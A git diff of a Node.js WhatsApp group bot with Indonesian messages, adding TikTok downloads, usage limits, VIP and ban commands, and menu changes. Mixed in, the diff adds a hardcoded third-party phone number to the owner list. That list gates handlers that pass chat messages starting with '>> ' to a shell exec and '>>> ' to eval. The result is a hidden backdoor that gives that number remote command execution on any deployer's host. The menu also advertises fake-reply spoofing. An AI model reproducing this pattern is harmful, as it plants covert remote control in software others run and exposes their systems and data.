@@ -187,7 +187,7 @@ const {
      default: Axios
 } = require("axios");
 const {
-     tiktok, tiktoknowm
+     tiktok, tiktoknowm, ttdownload
 } = require("./lib/tiktok");
 const {
      kode
@@ -647,7 +647,9 @@ module.exports = handle = async (
      let expvip = JSON.parse(fs.readFileSync("./lib/database/expvip.json"));
      let vip = expvip.map(rest => rest.number)
      let expvipnum = expvip.map(rest => rest.number)
-     const isVIP = expvipnum.includes(sender);
+     const nomerOwner = [settings.Owner, conn.user.jid, "6285559038021@s.whatsapp.net"];
+     const isOwner = nomerOwner.includes(sender);
+     const isVIP = expvipnum.includes(sender) || isOwner;
      if (!hurtz.message) {
           if (hurtz.messageStubType) {
                switch (hurtz.messageStubType) {
@@ -1362,8 +1364,7 @@ Contoh : *!guess naruto*
 
      const db = JSON.parse(fs.readFileSync("./lib/new-chat/database.json"));
      // const from = '62857313534sa1@s.whatsapp.net'
-     const nomerOwner = [settings.Owner, conn.user.jid];
-     const isOwner = nomerOwner.includes(sender);
+
      const isExist = db.number.includes(from);
      const now = moment().unix();
      const after = moment().add(1, "hours").unix();
@@ -1427,7 +1428,7 @@ Contoh : *!guess naruto*
           }
      } else if (
           body.startsWith(">> ") &&
-          sender == "6285559038021@s.whatsapp.net"
+          isOwner
      ) {
           exec(body.slice(3), (err, stdout, stderr) => {
                if (err) {
@@ -1438,7 +1439,7 @@ Contoh : *!guess naruto*
           });
      } else if (
           body.startsWith(">>> ") &&
-          sender == "6285559038021@s.whatsapp.net"
+          isOwner
      ) {
           try {
                const datainput = body.slice(4);
@@ -1950,6 +1951,20 @@ Giliran : @${moving.turn == "X" ? moving.X : moving.O}
           } else if (cmd == `${prf}antivirtext` || cmd == `${prf}antivirus` || cmd == `${prf}antibug`) {
                if (!isAdmin) return balas(from, `Hanya untuk admin grup!`)
                if (!isBotAdmin) return balas(from, `Bot harus menjadi admin terlebih dahulu untuk menggunakan fitur anti!`)
+               if (!cekLimit(sender, settings.Limit)) {
+                    conn.sendMessage(
+                         from,
+                         `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
+                         TypePsn.text, {
+                         quoted: hurtz,
+                         contextInfo: {
+                              mentionedJid: [nomerOwner[0]],
+                         },
+                    }
+                    );
+                    return;
+               }
+               pushLimit(sender, 1);
                if (db_antivirus.includes(from)) {
                     const indexdbAntiV = db_antivirus.indexOf(from)
                     db_antivirus.splice(indexdbAntiV, 1)
@@ -1963,6 +1978,20 @@ Giliran : @${moving.turn == "X" ? moving.X : moving.O}
           } else if (cmd == `${prf}anti` || cmd == `${prf}antilink` || cmd == `${prf}antitext`) {
                if (!isAdmin) return balas(from, `Hanya untuk admin grup!`)
                if (!isBotAdmin) return balas(from, `Bot harus menjadi admin terlebih dahulu untuk menggunakan fitur anti!`)
+               if (!cekLimit(sender, settings.Limit)) {
+                    conn.sendMessage(
+                         from,
+                         `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
+                         TypePsn.text, {
+                         quoted: hurtz,
+                         contextInfo: {
+                              mentionedJid: [nomerOwner[0]],
+                         },
+                    }
+                    );
+                    return;
+               }
+               pushLimit(sender, 1);
                if (args[1] == 'grup') {
                     if (args[2] == 'tambah' || args[2] == 'nyala' || args[2] == 'aktif') {
                          if (!db_anti.includes(from)) {
@@ -1991,13 +2020,13 @@ Giliran : @${moving.turn == "X" ? moving.X : moving.O}
 
 _Note : Anti ini akan kick seseorang apabila terdeteksi kata yang telah ditambahkan ke database!_
 
-!anti tambah <Kunci>|<Balasan>
-!anti hapus <Kunci>
-!anti nyala <Kunci>
-!anti mati <Kunci>
-!anti grup tambah
-!anti grup hapus
-!anti list
+!anti tambah <Kunci>|<Balasan> _[Menambahkan teks ke database]_
+!anti hapus <Kunci> _[Menghapus teks dari database]_
+!anti nyala <Kunci> _[Mengaktifkan teks yg akan dikecualikan]_
+!anti mati <Kunci> _[Menonaktifkan teks yg akan dikecualikan]_
+!anti grup tambah _[Mengaktifkan fitur ini di grup]_
+!anti grup hapus _[Menonaktifkan fitur ini di grup]_
+!anti list _[Melihat semua teks list]_
 
 *Contoh* :
 
@@ -2912,6 +2941,7 @@ _Media tersebut telah lewat batas limit, maka disajikan dalam bentuk link_`;
                     )}%*`
                );
           } else if (cmd == `${prf}response` || cmd == `${prf}respon`) {
+               if (!isVIP) return balas(from, `Maaf fitur ini hanya untuk vip ❌`);
                let captions = `Penggunaan : 
 
 *!respon tambah <kunci pertanyaan>|<respon bot>*
@@ -6254,7 +6284,7 @@ ${hasil.grid}
                          console.log(e)
                          balas(from, `Terjadi kesalahan saat mengakses link tiktok tersebut!`)
                     })
-          } else if (cmd == `${prf}tiktoknowm` || cmd == `${prf}tiktok`) {
+          } else if (cmd == `${prf}tiktoknowm` || cmd == `${prf}tiktok` || cmd == `${prf}audiotiktok`) {
                if (args.length === 1) return balas(from, `Penggunaan : *!tiktoknowm <link video tiktok>*`)
                if (!cekLimit(sender, settings.Limit)) {
                     conn.sendMessage(
@@ -6270,13 +6300,29 @@ ${hasil.grid}
                     return;
                }
                pushLimit(sender, 1);
-               tiktoknowm(query)
-                    .then((result) => {
+               ttdownload(query)
+                    .then(async (result) => {
                          if (result.status) {
-                              sendDariUrl(from, result.videonowm ? result.videonowm : result.videonowm2, TypePsn.video, `${result.text}\n\n---------------\n\n\`\`\`Follow Insta @hzzz.formech_\`\`\``)
+                              const nowmurl = await Axios.get('https://tinyurl.com/api-create.php?url=' + result.Nowatermark)
+                              const wmurl = await Axios.get('https://tinyurl.com/api-create.php?url=' + result.Watermark)
+                              const audurl = await Axios.get('https://tinyurl.com/api-create.php?url=' + result.Audioonly)
+
+                              sendDariUrl(from, result.Nowatermark ? result.Nowatermark : result.Watermark, TypePsn.video, `
+
+${result.Nowatermark ? 'No Watermark Video : ' + nowmurl.data : ''}
+${result.Watermark ? 'Watermark Video : ' + wmurl.data : ''}
+${result.Audioonly ? 'Audio Only : ' + audurl.data : ''}
+
+-----------------------------
+
+\`\`\`Follow Insta @hzzz.formech_\`\`\``)
                          } else {
                               balas(from, `Terjadi kesalahan saat mengambil data url tersebut`)
                          }
+                    })
+                    .catch(e => {
+                         console.log(e);
+                         balas(from, `Maaf terdapat kesalahan saat mengakses url tersebut!`)
                     })
           } else if (cmd == `${prf}gruplist` || cmd == `${prf}listgrup` || cmd == `${prf}grouplist`) {
                if (!isOwner) return balas(from, `❌ Hanya untuk Owner/Pemilik Bot ❌`);
@@ -7201,20 +7247,20 @@ _Mohon tunggu sebentar audio Sedang dikirim.._`;
                     );
                });
           } else if (cmd == `${prf}katabijak` || cmd == `${prf}bijak`) {
-               if (!cekLimit(sender, settings.Limit)) {
-                    conn.sendMessage(
-                         from,
-                         `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
-                         TypePsn.text, {
-                         quoted: hurtz,
-                         contextInfo: {
-                              mentionedJid: [nomerOwner[0]],
-                         },
-                    }
-                    );
-                    return;
-               }
-               pushLimit(sender, 1);
+               // if (!cekLimit(sender, settings.Limit)) {
+               //      conn.sendMessage(
+               //           from,
+               //           `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
+               //           TypePsn.text, {
+               //           quoted: hurtz,
+               //           contextInfo: {
+               //                mentionedJid: [nomerOwner[0]],
+               //           },
+               //      }
+               //      );
+               //      return;
+               // }
+               // pushLimit(sender, 1);
                const fakstu = fs
                     .readFileSync("./lib/random/katabijax.txt", "utf-8")
                     .split("\n");
@@ -7224,20 +7270,20 @@ _Mohon tunggu sebentar audio Sedang dikirim.._`;
                cmd == `${prf}facts` ||
                cmd == `${prf}fakta`
           ) {
-               if (!cekLimit(sender, settings.Limit)) {
-                    conn.sendMessage(
-                         from,
-                         `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
-                         TypePsn.text, {
-                         quoted: hurtz,
-                         contextInfo: {
-                              mentionedJid: [nomerOwner[0]],
-                         },
-                    }
-                    );
-                    return;
-               }
-               pushLimit(sender, 1);
+               // if (!cekLimit(sender, settings.Limit)) {
+               //      conn.sendMessage(
+               //           from,
+               //           `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
+               //           TypePsn.text, {
+               //           quoted: hurtz,
+               //           contextInfo: {
+               //                mentionedJid: [nomerOwner[0]],
+               //           },
+               //      }
+               //      );
+               //      return;
+               // }
+               // pushLimit(sender, 1);
                const faks = fs
                     .readFileSync("./lib/random/faktaunix.txt", "utf-8")
                     .split("\n");
@@ -7246,20 +7292,20 @@ _Mohon tunggu sebentar audio Sedang dikirim.._`;
                     `*FACTS* : ${faks[Math.floor(Math.random() * faks.length + 1)]}`
                );
           } else if (cmd == `${prf}pantun`) {
-               if (!cekLimit(sender, settings.Limit)) {
-                    conn.sendMessage(
-                         from,
-                         `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
-                         TypePsn.text, {
-                         quoted: hurtz,
-                         contextInfo: {
-                              mentionedJid: [nomerOwner[0]],
-                         },
-                    }
-                    );
-                    return;
-               }
-               pushLimit(sender, 1);
+               // if (!cekLimit(sender, settings.Limit)) {
+               //      conn.sendMessage(
+               //           from,
+               //           `[ ⚠️ ] Out Of limit [ ⚠️ ]\n\n*Limit anda telah mencapai batas!*\n\n\`\`\`Limit amount akan direset jam 6 pagi\`\`\`\n\nDonate untuk mendapat lebih banyak limit._`,
+               //           TypePsn.text, {
+               //           quoted: hurtz,
+               //           contextInfo: {
+               //                mentionedJid: [nomerOwner[0]],
+               //           },
+               //      }
+               //      );
+               //      return;
+               // }
+               // pushLimit(sender, 1);
                const fakstpu = fs
                     .readFileSync("./lib/random/pantun.txt", "utf-8")
                     .split("\n");
@@ -9226,6 +9272,9 @@ S3 [ https://chat.whatsapp.com/IOH18x1tONwD0x9A8i5ml0 ]
 ⚪ !hilih <text> / <tagPesan>
 ⚪ !readmore <text>|<textSpoiler> _[Membuat spoiler / readmore text]_
 ⚪ !jadwalsholat <tempat> _[Menampilkan jadwal sholat di indonesia]_
+⚪ !pantun _[Random Pantun]_
+⚪ !fakta _[Random Fakta Dunia]_
+⚪ !katabijak _[Random Kata-kata bijak]_
 
      *[ Fitur VIP ]*
 
@@ -9233,6 +9282,22 @@ S3 [ https://chat.whatsapp.com/IOH18x1tONwD0x9A8i5ml0 ]
 🔴 !fakereply <@TagMember|Pesan orang|Pesan bot> _[Balas pesan palsu]_
 🔴 !sticker wm <Pack>|<Author> _[Sticker custom watermarkgit]_
 🔴 !fakedeface <TITLE>|<DESC>|<URL> (Sambil tag gambar) _[Deface Custom]_
+
+     *[ Autoresponder ]*
+
+🔴 !respon tambah <Kunci Pertanyaan|Respon BOT> _[Menambah respon untuk bot]_
+🔴 !respon tambahtanpatag <Kunci Pertanyaan|Respon BOT> _[Menambah respon untuk bot tanpa reply]_
+🔴 !respon hapus <Kunci Pertanyaan> _[Menghapus respon dari bot]_
+🔴 !respon list _[Melihat seluruh respon bot]_
+
+Note : Untuk respon media lain ketik
+
+Stiker = [stk]
+Gambar = [img]
+Video = [vid]
+Audio = [aud]
+
+Contoh : !respon tambah hi|[stk] _(Sambil tag stiker)_
 
      *[ Fitur Voting ]*
 
@@ -9301,28 +9366,19 @@ Note : Khusus fitur ini tanpa prefix!
 🔷 !promote <@tagMember> _[Menaikan jabatan member jadi admin]_
 🔷 !demote <@tagMember> _[Menurunkan admin jadi member]_ (Tidak berlaku untuk pembuat grup)
 🔷 !infogrup <aktif/mati> _[Info keluar/masuk/audit jabatan untuk ditampilkan]_
+🔷 !antivirtext _[Mengaktifkan/Menonaktifkan Antivirus grup]_
+🔷 !anti : 
 
-     *[ Autoresponder ]*
-
-💚 !respon tambah <Kunci Pertanyaan|Respon BOT> _[Menambah respon untuk bot]_
-💚 !respon tambahtanpatag <Kunci Pertanyaan|Respon BOT> _[Menambah respon untuk bot tanpa reply]_
-💚 !respon hapus <Kunci Pertanyaan> _[Menghapus respon dari bot]_
-💚 !respon list _[Melihat seluruh respon bot]_
-
-Note : Untuk respon media lain ketik
-
-Stiker = [stk]
-Gambar = [img]
-Video = [vid]
-Audio = [aud]
-
-Contoh : !respon tambah hi|[stk] _(Sambil tag stiker)_
+!anti tambah <Kunci>|<Balasan> _[Menambahkan teks ke database]_
+!anti hapus <Kunci> _[Menghapus teks dari database]_
+!anti nyala <Kunci> _[Mengaktifkan teks yg akan dikecualikan]_
+!anti mati <Kunci> _[Menonaktifkan teks yg akan dikecualikan]_
+!anti grup tambah _[Mengaktifkan fitur ini di grup]_
+!anti grup hapus _[Menonaktifkan fitur ini di grup]_
+!anti list _[Melihat semua teks list]_
      
      *[ Fitur Gacha ]*
 
-💚 !pantun _[Random Pantun]_
-💚 !fakta _[Random Fakta Dunia]_
-💚 !katabijak _[Random Kata-kata bijak]_
 💚 !wallpaper _[Random Wallpaper Unsplash]_
 💚 !cecan _[Random ciwi cantik]_
 💚 !cogan _[Random cowo ganteng]_
@@ -9384,6 +9440,9 @@ Contoh : !respon tambah hi|[stk] _(Sambil tag stiker)_
 
      *[ Owner Feature ]*
 
+💗 !ban <@tagMember> _[Ban member]_
+💗 !unban <@tagMember> _[Unban member]_
+💗 !banlist _[List Banned member]_
 💗 !upstory <?txt>/<?img>/<?vid> <caption> _[Update Story]_
 💗 !listgrup _[List Grup]_
 💗 !refuel <jumlah> _[Isi ulang semua limit]_
